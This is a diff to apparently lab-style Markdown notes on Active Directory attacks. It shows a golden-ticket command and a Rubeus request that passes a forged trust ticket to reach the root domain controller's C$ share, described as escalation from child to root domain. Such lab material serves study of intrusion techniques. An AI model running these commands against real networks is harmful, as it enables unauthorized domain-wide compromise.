@@ -615,9 +615,19 @@ C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:d
 
 
 ```powershell
-Rubeus.exe asktgs
-/ticket:C:\AD\Tools\kekeo_old\trust_tkt.kirbi
-/service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-
-dc.moneycorp.local /ptt
+Rubeus.exe asktgs /ticket:C:\AD\Tools\kekeo_old\trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt
+```
+
+
+4. Run command on remote system
+
+```powershell
 ls \\mcorp-dc.moneycorp.local\c$
 ```
+
+
+> This is how to escalate from child of root
+
+
+
+
